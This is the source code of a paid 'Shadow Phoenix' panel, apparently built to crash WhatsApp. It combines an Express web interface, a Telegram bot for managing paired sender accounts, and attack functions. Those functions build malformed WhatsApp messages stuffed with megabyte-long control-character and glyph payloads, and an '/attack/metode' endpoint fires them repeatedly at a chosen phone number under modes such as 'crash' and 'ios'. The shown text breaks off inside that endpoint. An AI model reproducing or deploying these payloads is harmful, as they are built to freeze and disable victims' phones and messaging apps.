const { Token, owner } = require("./settings/config");
const express = require("express");
const fs = require("fs");
const url = require('url');
const path = require("path");
const cookieParser = require('cookie-parser');
const { exec } = require('child_process');
const cors = require('cors');
const crypto = require('crypto');
const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    getGroupInviteInfo,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateMessageID,
    generateWAMessageContent,
    encodeSignedDeviceIdentity,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    isJidUser,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    BaileysError,
} = require('@whiskeysockets/baileys');
const pino = require("pino");
const { Telegraf, Markup } = require("telegraf");

const app = express();
const PORT = process.env.PORT || 2451;

app.use(express.json());
app.use(express.static('public'));
app.use(cookieParser());
app.use(cors());

app.use(express.static(path.join(__dirname, 'public')));

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./sessions";
const bot = new Telegraf(Token);

let dray;

let maintenanceMode = false;
let totalRequests = 0;

setInterval(() => {
  totalRequests = 0;
}, 5000);

app.use(async (req, res, next) => {
  if (maintenanceMode) {
    return res.status(503).sendFile(path.join(__dirname, 'public', '503.html'));
  }

  totalRequests++;

  if (totalRequests >= 1000000) {
    maintenanceMode = true;

    const message = encodeURIComponent(
      'Dangerous!\nServer reaches 1,000,000 requests per 5 seconds auto 503'
    );

    const url = `https://api.telegram.org/bot${Token}/sendMessage?chat_id=${owner}&text=${message}`;
    fetch(url)
      .then(r => console.log('Telegram notification sent'))
      .catch(err => console.error('Telegram notification failed', err));

    console.log('Threshold reached! Maintenance mode ON.');

    return res.status(503).sendFile(path.join(__dirname, 'public', '503.html'));
  }

  next();
});

setInterval(() => {
  if (maintenanceMode) {
    maintenanceMode = false;
    console.log('Server recovered. Maintenance mode OFF.');
  }
}, 60000);

const loadAccounts = () => {
  return fs.existsSync('./db/db.json') ? JSON.parse(fs.readFileSync('./db/db.json')) : [];
};

const isAccountExpired = (date) => {
  if (!date) return false;
  return new Date(date).getTime() < Date.now();
};

const generateToken = (user) => {
  const payload = {
    username: user.username,
    role: user.role,
    timestamp: Date.now()
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
};

const verifyToken = (token) => {
  try {
    const payload = JSON.parse(Buffer.from(token, 'base64').toString());
    const accounts = loadAccounts();
    const user = accounts.find(acc => acc.username === payload.username);
    return user ? payload : null;
  } catch (error) {
    return null;
  }
};

const requireAuth = (req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const payload = verifyToken(token);
  if (!payload) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }
  req.user = payload;
  next();
};

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/home', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/track', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

app.get('/bug', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'bug.html'));
});

app.get('/ddos', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'ddos.html'));
});

app.get('/contac', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'contac.html'));
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const accounts = loadAccounts();
  const user = accounts.find(acc => acc.username === username && acc.password === password);

  if (!user) {
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
  }

  if (isAccountExpired(user.expired)) {
    const updatedAccounts = accounts.filter(acc => acc.username !== username);
    fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));
    return res.status(401).json({ success: false, message: 'Account has expired' });
  }

  const validRole = ['ADMIN', 'VIP'].includes(user.role.toUpperCase()) ? user.role.toUpperCase() : 'VIP';
  const token = generateToken(user);

  res.json({
    success: true,
    token,
    user: { username: user.username, role: validRole, expired: user.expired }
  });
});

app.post('/api/logout', requireAuth, (req, res) => {
  res.json({ success: true, message: 'Logged out' });
});

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Found ${activeNumbers.length} active WhatsApp sessions`);

  for (const botNumber of activeNumbers) {
    console.log(`Connecting WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    dray = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      dray.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${botNumber} connected!`);
          sessions.set(botNumber, dray);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      dray.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, {
    parse_mode: "Markdown"
  });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
        parse_mode: "Markdown"
      });
    } catch (e) {
      console.error("Error:", e.message);
    }
  };

  let paired = false;

  dray = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  dray.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await dray.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, dray);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log("Reconnect diperlukan untuk", botNumber);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }
  });

  dray.ev.on("creds.update", saveCreds);
  return dray;
};

const makeStatus = (number, status) => 
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;

const DB_FILE = "./db/db.json";
let db = fs.existsSync(DB_FILE) ? JSON.parse(fs.readFileSync(DB_FILE)) : [];

const AUTH_FILE = "./db/auth.json";
let authorized = fs.existsSync(AUTH_FILE) ? JSON.parse(fs.readFileSync(AUTH_FILE)) : [];

function saveDB() {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
function saveAuth() {
  fs.writeFileSync(AUTH_FILE, JSON.stringify(authorized, null, 2));
}

function checkAuth(ctx) {
  ctx.isOwner = ctx.from?.id?.toString() === owner;
  ctx.isAuthorized = ctx.isOwner || authorized.includes(ctx.from?.id?.toString());
}

bot.use(async (ctx, next) => {
  ctx.isOwner = ctx.from?.id?.toString() === owner;
  return next();
});

bot.start((ctx) => {
  ctx.replyWithPhoto(
    { url: 'https://files.catbox.moe/l6rhvm.jpg' },
    {
      caption: `
[  ♱ 𝗦𝗛𝗔𝗗𝗢𝗪 𝗣𝗛𝗢𝗘𝗡𝗜𝗫 ♱  ]
╭─────────────────────────╸╴
│ Sᴄʀɪᴘᴛ : Shadow Phoenix
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @DryzxModders
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @MexxModders
│ Vᴇʀsɪᴏɴ : 1.0
│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
│ Mᴏᴅᴇ : Pᴜʙʟɪᴄ
│ Mᴏᴅᴇʟ : Jᴀᴠᴀ Sᴄʀɪᴘᴛ
│ 
│ 🔹 /pairing <number>
│ 🔹 /listpairing
│ 🔹 /delpairing <number>
│ 🔹 /address <id>
│ 🔹 /delress <id>
│ 🔹 /addakun
│ 🔹 /listakun
│ 🔹 /delakun <username> <password>
╰─────────────────────────╸╴`,
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.url('👤 Owner', 'https://t.me/DryzxModders')],
        [Markup.button.url('👤 Owner', 'https://t.me/MexxModders')]
      ])
    }
  );
});

bot.command("pairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: `/pairing <number>`", { parse_mode: "Markdown" });
  const botNumber = args[1];
  await ctx.reply(`⏳ Starting pairing to number ${botNumber}...`);
  await connectToWhatsApp(botNumber, ctx.chat.id, ctx);
});

bot.command("listpairing", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  if (sessions.size === 0) return ctx.reply("no active sender.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Active Sender List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delpairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delpairing 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender not found.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} successfully deleted.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Failed to delete sender.");
  }
});

bot.command("address", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Not authorized.");
  const parts = ctx.message.text.split(" ");
  const tgId = parts[1];
  if (!tgId) return ctx.reply("❌ Usage: /address <id>");
  if (authorized.includes(tgId)) return ctx.reply("⚠️ User already registered.");
  authorized.push(tgId);
  saveAuth();
  ctx.reply(`✅ User ${tgId} has been granted access.`);
});

bot.command("listakun", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return ctx.reply("❌ You are not authorized.");
  if (db.length === 0) return ctx.reply("📂 No accounts available.");

  let msg = "📜 Accounts:\n\n";
  db.forEach((acc, i) => {
    msg += `#${i}\n👤 ${acc.username}\n🎭 ${acc.role}\n⏳ ${acc.expired}\n\n`;
  });
  ctx.reply(msg);
});

let addStep = {};
bot.command("addakun", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return ctx.reply("❌ You are not authorized.");

  addStep[ctx.from.id] = { step: 1, data: {} };
  ctx.reply("👤 Send username:");
});

bot.on("text", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return;
  const step = addStep[ctx.from.id];
  if (!step) return;

  if (step.step === 1) {
    step.data.username = ctx.message.text.trim();
    step.step = 2;
    ctx.reply("🔑 Send password:");
  } else if (step.step === 2) {
    step.data.password = ctx.message.text.trim();
    step.step = 3;
    ctx.reply("🎭 Send role (ADMIN/VIP):");
  } else if (step.step === 3) {
    step.data.role = ctx.message.text.trim().toUpperCase();
    step.step = 4;
    ctx.reply("⏳ Send expired date (YYYY-MM-DD):");
  } else if (step.step === 4) {
    step.data.expired = new Date(ctx.message.text.trim()).toISOString();
    db.push(step.data);
    saveDB();
    ctx.reply(`✅ Account *${step.data.username}* added.`, { parse_mode: "Markdown" });
    delete addStep[ctx.from.id];
  }
});

bot.command("delakun", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return ctx.reply("❌ You are not authorized.");

  const parts = ctx.message.text.split(" ");
  if (parts.length < 3) {
    return ctx.reply("❌ Usage: /delakun <username> <password>");
  }

  const username = parts[1];
  const password = parts[2];

  const index = db.findIndex(acc => acc.username === username && acc.password === password);

  if (index === -1) {
    return ctx.reply("⚠️ Account not found or credentials do not match.");
  }

  const removed = db.splice(index, 1);
  saveDB();
  ctx.reply(`🗑️ Account **${removed[0].username}** deleted successfully.`, { parse_mode: "Markdown" });
});

bot.command("delress", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Not authorized.");
  const parts = ctx.message.text.split(" ");
  const tgId = parts[1];
  if (!tgId) return ctx.reply("❌ Usage: /delress <id>");
  authorized = authorized.filter((id) => id !== tgId);
  saveAuth();
  ctx.reply(`🗑️ User ${tgId} access revoked.`);
});

// fangsion kamyuh
async function DelayNew(isTarget) {
    let permissionX = await generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "hi my name is mexx!!?༑",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let permissionY = await generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "hi my name is mexx!!?༑",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await dray.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [isTarget],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: isTarget },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await dray.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [isTarget],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: isTarget },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function paymentDelay(isTarget) {
  try {
    let payMessage = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                reference_id: null,
                payment_method: "\u0010".repeat(0x2710),
                payment_timestamp: null,
                share_payment_status: true,
              }),
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    const msgPay = generateWAMessageFromContent(isTarget, payMessage, {});
    await dray.relayMessage(isTarget, msgPay.message, {
      additionalNodes: [{ tag: "biz", attrs: { native_flow_name: "payment_method" } }],
      messageId: msgPay.key.id,
      participant: { jid: isTarget },
      userJid: isTarget,
    });

    const msgStory = await generateWAMessageFromContent(
      isTarget,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000),
              },
              body: {
                text: "hi my name is mexx!?",
                format: "DEFAULT",
              },
            },
          },
        },
      },
      {
        isForwarded: false,
        ephemeralExpiration: 0,
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
        forwardingScore: 0,
        font: Math.floor(Math.random() * 9),
      }
    );

    await dray.relayMessage("status@broadcast", msgStory.message, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }],
            },
          ],
        },
      ],
      statusJidList: [isTarget],
      messageId: msgStory.key.id,
    });

  } catch (err) {}
}

async function InvisibleIphone(isTarget, mention) {
const ameliakill = "mexx whyy ¿?" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),

address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: "yandek.com",
      }
      let msg = generateWAMessageFromContent(isTarget, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "mexx whyy ¿?" + ameliakill,
            matchedText: "mexx whyy ¿?",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "mexx whyy ¿?" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(isTarget, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(isTarget, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await dray.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [isTarget],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: isTarget
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await dray.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [isTarget],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: isTarget
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await dray.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [isTarget],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: isTarget
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

async function MexxDelay(isTarget) {
for (let i = 0; i <= 5; i++) {
await DelayNew(isTarget);
await paymentDelay(isTarget);
}    
}

app.get("/attack/metode", requireAuth,  async (req, res) => {
  try {
    const metode = req.query.metode;
    const target = req.query.target;

    if (!metode || !target) {
      return res.status(400).json({ status: false, message: "'metode' and 'target' required" });
    }

    const isTarget = target.replace(/\D/g, "") + "@s.whatsapp.net";

    if (sessions.size === 0) {
      return res.status(400).json({ status: false, message: "No active sender" });
    }

    const botNumber = [...sessions.keys()][0];
    const sock = sessions.get(botNumber);
    if (!sock) {
      return res.status(400).json({ status: false, message: "Socket not found" });
    }

    switch (metode.toLowerCase()) {
      case "crash":
        for (let i = 0; i < 100; i++) {
          await MexxDelay(isTarget)
        }
        break;

      case "foreclose":
        for (let i = 0; i < 100; i++) {
          await MexxDelay(isTarget)
        }
        break;

      case "blank":
        for (let i = 0; i < 100; i++) {
          await MexxDelay(isTarget)
        }
        break;

      case "ios":
        for (let i = 0; i < 100; i++) {
          await MexxDelay(isTarget)
        }
        break;

      case "delay":
        for (let i = 0; i < 100; i++) {
